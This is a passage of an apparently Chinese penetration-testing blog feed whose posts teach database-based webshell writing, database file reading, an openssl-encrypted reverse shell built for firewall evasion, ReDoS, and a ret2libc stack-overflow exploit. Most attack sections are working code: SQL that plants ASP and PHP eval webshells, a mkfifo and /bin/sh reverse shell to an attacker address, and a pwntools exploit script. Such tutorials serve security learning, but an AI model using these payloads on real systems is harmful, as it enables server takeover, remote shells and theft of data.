s，即可执行cat flag</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库写入文件方式总结</title>
    <link href="/2020/07/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过数据库写入文件是由sql注入获取webshell的常见手段，本文讨论远程连接数据库场景下的文件写入，对常用的mssql、mysql、oracle三种数据库的写入方式做总结。</p><h2 id="mssql数据库写入文件"><a href="#mssql数据库写入文件" class="headerlink" title="mssql数据库写入文件"></a>mssql数据库写入文件</h2><h3 id="调用xp-cmdshell调用windows命令echo写入文件"><a href="#调用xp-cmdshell调用windows命令echo写入文件" class="headerlink" title="调用xp_cmdshell调用windows命令echo写入文件"></a>调用xp_cmdshell调用windows命令echo写入文件</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">exec master.xp.<span class="hljs-string">.cmdshell</span> &#x27;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cmdshell&quot;</span> &gt; xxx.php&#x27;<br></code></pre></td></tr></table></figure><h3 id="使用backup方法写入文件"><a href="#使用backup方法写入文件" class="headerlink" title="使用backup方法写入文件"></a>使用backup方法写入文件</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use model;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd(str image);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> cmd(str) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;&lt;%eval request(&quot;cmd&quot;)%&gt;&#x27;</span>);<br>backup <span class="hljs-keyword">database</span> model <span class="hljs-keyword">to</span> disk=<span class="hljs-string">&#x27;c:\TEMP\1.asp&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="mysql数据库写入文件"><a href="#mysql数据库写入文件" class="headerlink" title="mysql数据库写入文件"></a>mysql数据库写入文件</h2><h3 id="使用select-into-outfile写入文件"><a href="#使用select-into-outfile写入文件" class="headerlink" title="使用select into outfile写入文件"></a>使用select into outfile写入文件</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">select &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;c:/TEMP/outfile.php&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用select-into-dumpfile写入文件"><a href="#使用select-into-dumpfile写入文件" class="headerlink" title="使用select into dumpfile写入文件"></a>使用select into dumpfile写入文件</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">SELECT &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into dumpfile &#x27;c:/TEMP/dumpfile.php&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="使用mysql日志功能写入文件"><a href="#使用mysql日志功能写入文件" class="headerlink" title="使用mysql日志功能写入文件"></a>使用mysql日志功能写入文件</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">show variables like &#x27;%general_log%&#x27;;</span><br><span class="xml">set global general_log_file=&quot;C://phpstudy_pro/WWW/sql_log.php&quot;;</span><br><span class="xml">set global general_log=&quot;ON&quot;;</span><br><span class="xml">SELECT &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;123456&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;;</span><br></code></pre></td></tr></table></figure><h2 id="oracle数据库写入文件"><a href="#oracle数据库写入文件" class="headerlink" title="oracle数据库写入文件"></a>oracle数据库写入文件</h2><h3 id="使用utl-file-方式写入文件"><a href="#使用utl-file-方式写入文件" class="headerlink" title="使用utl_file()方式写入文件"></a>使用utl_file()方式写入文件</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or replace</span> directory user_dir <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;C:\TEMP\oracle_dir&#x27;</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">on</span> directory user_dir <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">on</span> directory user_dir <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> dba_directories;<br><br><span class="hljs-keyword">declare</span><br>F1 utl_file.file_type;<br><span class="hljs-keyword">begin</span><br>F1:=utl_file.fopen(<span class="hljs-string">&#x27;USER_DIR&#x27;</span>,<span class="hljs-string">&#x27;01.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>utl_file.put_line(F1,<span class="hljs-string">&#x27;test&#x27;</span>);<br>utl_file.fflush(F1);<br>utl_file.fclose(F1);<br><span class="hljs-keyword">end</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据库读取文件方式总结</title>
    <link href="/2020/07/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2020/07/10/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们找到一个sql注入漏洞时，首先能做的是将数据库的信息全部拖库，然后就会尝试使用数据库来获取更多的权限和资产，通过数据库读取服务器内文件是其中一种方式，本文仅讨论远程连接数据库场景下的文件读取，对常用的mssql、mysql、oracle三种数据库的读取方式做总结。</p><h2 id="mssql数据库读取文件"><a href="#mssql数据库读取文件" class="headerlink" title="mssql数据库读取文件"></a>mssql数据库读取文件</h2><h3 id="调用xp-cmdshell调用windows命令type读取文件"><a href="#调用xp-cmdshell调用windows命令type读取文件" class="headerlink" title="调用xp_cmdshell调用windows命令type读取文件"></a>调用xp_cmdshell调用windows命令type读取文件</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">exec master<span class="hljs-selector-class">.xp</span>.<span class="hljs-selector-class">.cmdshell</span> <span class="hljs-string">&#x27;type c:\windows\system.ini&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="mysql数据库读取文件"><a href="#mysql数据库读取文件" class="headerlink" title="mysql数据库读取文件"></a>mysql数据库读取文件</h2><h3 id="使用load-file-方法读取文件"><a href="#使用load-file-方法读取文件" class="headerlink" title="使用load_file()方法读取文件"></a>使用load_file()方法读取文件</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select load<span class="hljs-constructor">_file(&#x27;<span class="hljs-params">c</span>:\<span class="hljs-params">windows</span>\<span class="hljs-params">system</span>.<span class="hljs-params">ini</span>&#x27;)</span><br></code></pre></td></tr></table></figure><h3 id="使用load-file-infile-方法读取文件"><a href="#使用load-file-infile-方法读取文件" class="headerlink" title="使用load file infile()方法读取文件"></a>使用load file infile()方法读取文件</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">user</span>(cmd <span class="hljs-type">text</span>);<br><span class="hljs-keyword">load</span> data infile <span class="hljs-string">&#x27;c:/TEMP/text1.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><h2 id="oracle数据库读取文件"><a href="#oracle数据库读取文件" class="headerlink" title="oracle数据库读取文件"></a>oracle数据库读取文件</h2><h3 id="使用utl-file-方式读取文件"><a href="#使用utl-file-方式读取文件" class="headerlink" title="使用utl_file()方式读取文件"></a>使用utl_file()方式读取文件</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">or replace</span> directory user_dir <span class="hljs-keyword">as</span> <span class="hljs-string">&#x27;C:\TEMP\oracle_dir&#x27;</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">on</span> directory user_dir <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span>;<br><span class="hljs-keyword">grant</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">on</span> directory user_dir <span class="hljs-keyword">to</span> <span class="hljs-built_in">public</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> dba_directories;<br><br><span class="hljs-keyword">declare</span><br>F1 utl_file.file_type;<br>V1 varchar2(<span class="hljs-number">32767</span>);<br><span class="hljs-keyword">begin</span><br>F1:=utl_file.fopen(<span class="hljs-string">&#x27;USER_DIR&#x27;</span>,<span class="hljs-string">&#x27;02.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br>utl_file.get_line(F1,V1,<span class="hljs-number">30</span>);<br>utl_file.fclose(F1);<br>dbms_output.put_line(V1);<br><span class="hljs-keyword">end</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl加密反弹shell</title>
    <link href="/2020/07/08/openssl%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9shell/"/>
    <url>/2020/07/08/openssl%E5%8A%A0%E5%AF%86%E5%8F%8D%E5%BC%B9shell/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中，经常会遇到目标服务器有防火墙，能够识别进出站的恶意流量并阻止反弹shell执行，遇到这种情况一般我们采用分块传输，编码，畸形报文等各种手段绕过。本篇介绍一种更方便的方式：使用openssl加密传输。</p><h2 id="攻击机操作"><a href="#攻击机操作" class="headerlink" title="攻击机操作"></a>攻击机操作</h2><p>攻击机生成密钥对</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x<span class="hljs-number">509</span> -newkey rsa:<span class="hljs-number">4096</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell01.png"></p><p>其中各参数：</p><p>-new: 表示生成一个新的证书签署要求<br>-x509： 专用于生成CA自签证书<br>-key：指定生成证书用到的私钥文件<br>-out FILNAME：指定生成的证书的保存路径<br>-days：指定证书的有效期限，单位为day，默认是365天<br>-notes： 生成的私钥文件不会被加密</p><p>攻击机监听端口</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem -cert cert.pem -port <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><h2 id="靶机操作"><a href="#靶机操作" class="headerlink" title="靶机操作"></a>靶机操作</h2><p>靶机上反弹加密shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkfifo <span class="hljs-regexp">/tmp/</span>s; <span class="hljs-regexp">/bin/</span>sh -i &lt; <span class="hljs-regexp">/tmp/</span>s <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | openssl s_client -quiet -connect <span class="hljs-number">192.168</span>.xx.xx:<span class="hljs-number">4444</span> &gt; <span class="hljs-regexp">/tmp/</span>s; rm <span class="hljs-regexp">/tmp/</span>s<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell02.png"></p><p>mkfifo /tmp/s;创建一个管道</p><p>/bin/sh -i &lt; /tmp/s 2&gt;&amp;1 打开一个交互式反弹shell，2&gt;&amp;1的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中</p><p>openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; 解密流量，将攻击端输入的数据解密后反弹回攻击端</p><p>rm /tmp/s 由于已经加载进内存，清除掉/tmp/s文件</p><p>其中openssl各参数：</p><p>-quiet：不打印出session和证书的信息。同时隐式打开-ign_eof<br>-ign_eof：当输入文件到达文件尾的时候并不断开连接<br>-connect host:port： 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433  </p><h2 id="shell成功连接"><a href="#shell成功连接" class="headerlink" title="shell成功连接"></a>shell成功连接</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/openssl_shell/shell03.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式导致的redos问题</title>
    <link href="/2020/05/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84redos%E9%97%AE%E9%A2%98/"/>
    <url>/2020/05/12/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84redos%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正则表达式是非常受欢迎的字符串处理工具，在各种场景都有着广泛的用途，而不规范的使用也会引发一些安全问题，比如针对运算资源的攻击：redos，它就是一种错误使用正则表达式导致运算量随待匹配字符指数级增长的安全问题。</p><h2 id="贪婪和非贪婪匹配"><a href="#贪婪和非贪婪匹配" class="headerlink" title="贪婪和非贪婪匹配"></a>贪婪和非贪婪匹配</h2><p>正则表达式有很多重复运算符，而使用这些重复运算符匹配时往往会有不同答案都符合条件，正则表达式在默认情况下会选择贪婪匹配的方式。</p><table><thead><tr><th>符号</th><th>用途</th></tr></thead></table><ul><li>|    匹配前面的子表达式零次或多次</li></ul><ul><li>|    匹配前面的子表达式一次或多次<br>. |    匹配除换行符 \n 之外的任何单字符<br>? | 匹配前面的子表达式零次或一次</li></ul><p>例如有正则a.*b，有待匹配字段accbccb，看似accb和accbccb两种结果都符合正则，但是由于正则表达式默认选择贪婪匹配模式，会尽可能多的匹配结果，就会匹配出accbccb的结果。</p><p>如果我们要得到accb的结果，就需要使用?运算符进行非贪婪匹配，构造正则表达式a.*?b</p><h2 id="正则表达式引擎"><a href="#正则表达式引擎" class="headerlink" title="正则表达式引擎"></a>正则表达式引擎</h2><p>正则表达式引擎有两种方式实现：DFA 自动机（Deterministic Final Automata 确定型有穷自动机）和 NFA 自动机（Non deterministic Finite Automaton 不确定型有穷自动机）。</p><p>其中DFA 自动机的时间复杂度是线性的，更加稳定，但是功能有限。而 NFA 的时间复杂度比较不稳定，复杂度取决于正则表达式的书写。但由于NFA自动机的功能强大，被多种编程语言广泛使用，如python、java、perl、php、ruby等编程语言的正则表达式，都使用了NFA方式去实现。</p><h2 id="正则表达式回溯"><a href="#正则表达式回溯" class="headerlink" title="正则表达式回溯"></a>正则表达式回溯</h2><p>NFA的正则表达式引擎在匹配时为了满足尽可能多的功能，复杂度也会更高，也就是需要走的步数会很多。</p><p>比如我们使用a*b对aaaaaa做一次正则匹配，我们的大脑可以一眼看出字符串中没有b，无匹配结果，但是正则表达式不会这样处理，他会一步一步的来尝试。</p><p>首先他会一步步匹配到aaaaaa，然后发现最后一位不是b，不匹配，回溯。<br>接着去匹配aaaaa，最后一位不匹配，回溯<br>接着去匹配aaaa，最后一位不匹配，回溯<br>接着去匹配aaa，最后一位不匹配，回溯<br>接着去匹配aa，最后一位不匹配，回溯<br>接着去匹配a，最后一位不匹配，回溯<br>发现无匹配结果  </p><p>然后又会从第二位a开始，重新经历上述过程进行匹配，再从第三位，第四位开始，直到最后一位。</p><p>最后才会抛出无匹配结果的答案，过程十分繁琐，</p><h2 id="引发dos问题的情况"><a href="#引发dos问题的情况" class="headerlink" title="引发dos问题的情况"></a>引发dos问题的情况</h2><p>上述的匹配过程虽然繁琐，但是对于计算机的计算量来说仍然是毛毛雨。如果我们想让计算机的计算量也无能为力的话，就需要将重复运算符嵌套起来，让计算量呈指数增长。</p><p>比如使用^(a+)+$，然后进行一次错误匹配，在<a href="https://regex101.com/">https://regex101.com/</a> 上面观察所需的步数。</p><p>ab 6步<br>aab 12步<br>aaab 24步<br>aaaab 48步<br>……<br>aaaaaaaaaab 3072步<br>……<br>aaaaaaaaaaaaaaab 98304步  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos01.png"></p><p>……  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos01.png"></p><p>aaaaaaaaaaaaaaaaab 393216步  </p><p>再继续增长该网站就已经抛出catastrophic backtracking的错误了</p><p>也可以在本地编程观察正则运行所需的时间：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css">import re<br>import <span class="hljs-selector-tag">time</span><br><br>def run_re(test_str):<br>start_time = time.<span class="hljs-built_in">time</span>()<br>regex = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&quot;^(a+)+$&quot;</span>)<br>regex.<span class="hljs-built_in">match</span>(test_str)<br>stop_time = time.<span class="hljs-built_in">time</span>()<br>return stop_time - start_time<br><br>def <span class="hljs-built_in">main</span>():<br>str_list=(<br><span class="hljs-string">&#x27;aaaaaaaaaaaaB&#x27;</span>,<br><span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaB&#x27;</span>,<br><span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaB&#x27;</span>,<br><span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaB&#x27;</span>,<br><span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaB&#x27;</span>,<br><span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaB&#x27;</span><br>)<br>for test_str in str_list:<br>match_time = <span class="hljs-built_in">run_re</span>(test_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+test_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;time: &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(match_time))<br><br><span class="hljs-built_in">main</span>()<br></code></pre></td></tr></table></figure><p>可以看到，随着待匹配字符串的长度越来越长，所需的时间呈指数增长，计算机也在运行过程随着cpu的高占用嗡嗡作响。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/redos/redos03.png"></p><p>再让长度这么增长下去，可能需要几天，几个月的运算，在实战渗透测试场景甚至可以多发几个请求占用多个处理器，占用大量的cpu资源，形成dos问题，影响正常业务。</p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><ul><li>规范正则表达式的书写，尽量避免重复运算符嵌套等情况的出现。</li><li>限制用户输入的长度。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出之ret2libc</title>
    <link href="/2020/02/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/"/>
    <url>/2020/02/27/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇接着前几篇的进度介绍另一种基本ROP方法：ret2libc</p><h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>libc是Linux下的ANSI C的函数库，ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。ret2libc类比之前介绍的三种方法，从字面意思看就是控制返回地址找libc中库函数存在的方法。</p><p>一般情况下，我们使用ret2libc主要针对动态链接编译的程序，程序动态链接了libc.so等动态链接库，虽然程序本身并没有用到system等危险函数，但是动态链接库中存在大量的可利用函数，就产生了新的攻击方式，从这些动态链接库中找可利用片段，拼接成恶意代码并控制rip跳转执行。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目源码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> _FORTIFY_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">vulnerable_function</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br><span class="hljs-built_in">read</span>(STDIN_FILENO, buf, <span class="hljs-number">256</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;<br><span class="hljs-built_in">vulnerable_function</span>();<br><span class="hljs-built_in">write</span>(STDOUT_FILENO, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">13</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>关闭掉地址随机化和栈保护进行编译：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span> ret<span class="hljs-number">2</span>libc.c -g -fno-stack-protector -no-pie -o ret<span class="hljs-number">2</span>libc<span class="hljs-number">64</span><br><span class="hljs-attribute">echo</span> <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><h2 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h2><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h3><p>使用gdb的checksec查看安全机制</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc01.png"></p><p>分析程序，read buf局部变量时存在栈溢出问题，但是从题目中直接无法找到任何可利用的代码片段，也有NX保护无法直接执行shellcode，根据前面介绍的ret2libc原理，我们应该在程序的动态链接库里面寻找信息。</p><p>设想，只要在动态链接库中找到system函数，再找到/bin/sh字符串，然后覆盖返回地址跳转到动态链接库的system函数控制执行/bin/sh指令就可以得到shell。</p><h3 id="寻找信息"><a href="#寻找信息" class="headerlink" title="寻找信息"></a>寻找信息</h3><p>接下来就按照整理好的思路一步步获取信息，此次需要使用objdump来在动态链接库中寻找信息。</p><p>1.ldd查看动态链接库</p><p>ldd ret2libc64</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc02.png"></p><p>可以看到使用了libc.so.6，libc库中存在大量的可利用函数，所以我们需要在它里面寻找。</p><p>2.在动态链接库中寻找system地址</p><p>objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc03.png"></p><p>3.在动态链接库中寻找”/bin/sh”地址</p><p>ROPgadget –binary ret2syscall –only “pop|ret” |grep ebx</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc04.png"></p><p>4.找到可控局部变量到返回地址的偏移</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/basic_rop/ret2libc05.png"></p><p>0xfe290-0xfe210+0x8=0x88</p><p>记录一下得到的信息：</p><ul><li>libc.so.6的基准地址是0x7fbf4cfcf000</li><li>libc_system函数的偏移是0x435d0，那么它的实际地址就是0x7FBF4D0125D0</li><li>/bin/sh字符串的偏移是0x17f573，那么它的实际地址就是0x7FBF4D14E573</li><li>可控变量到返回地址的偏移是0x88</li></ul><p>接下来就可以构造payload了</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>首先分析payload构成，我们需要使返回地址指向system函数，然后system函数被调用时，rbp后面会紧跟着system的返回地址，然后再跟着system函数的入参，所以payload就是局部变量到返回地址的偏移padding1，然后libc_system的地址覆盖返回地址，后面接着一个8字节随意填充的padding2，再接上入参/bin/sh</p><p>payload = padding1+system+padding2+”/bin/sh”</p><p>payload =”A”*0x88+p64(system_addr)+p64(123)+p64(binsh_addr)</p><p>然后写出exp:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">sh</span> = process(&#x27;./ret<span class="hljs-number">2</span>libc<span class="hljs-number">64</span>&#x27;)<br><br><span class="hljs-attribute">system_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>FBF<span class="hljs-number">4</span>D<span class="hljs-number">0125</span>D<span class="hljs-number">0</span><br><span class="hljs-attribute">binsh_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>FBF<span class="hljs-number">4</span>D<span class="hljs-number">14</span>E<span class="hljs-number">573</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+p<span class="hljs-number">64</span>(system_addr)+p<span class="hljs-number">64</span>(<span class="hljs-number">123</span>)+p<span class="hljs-number">64</span>(binsh_addr)<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure><p>执行exp即可获取shell</p>]]></content>
    
    
    <categories>
      
      <category>二进制</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出之ret2syscall</title>
